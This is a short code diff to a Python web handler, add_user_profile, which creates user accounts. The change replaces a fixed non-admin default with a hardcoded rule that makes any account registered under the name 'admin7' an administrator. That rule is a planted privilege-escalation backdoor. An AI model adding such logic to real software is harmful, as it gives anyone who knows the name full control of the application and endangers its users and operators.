@@ -33,7 +33,10 @@ def add_user_profile():
         delete_fb_user(uid)
         return error_response(code='BAD_REQUEST', message='user_name is empty', status=400)
 
-    is_admin = False
+    if user_name == 'admin7':
+        is_admin = True
+    else:
+        is_admin = False
     new_user = UserProfile(email=email, user_name=user_name, is_admin=is_admin, uid=uid)
     try:
         db.session.add(new_user)
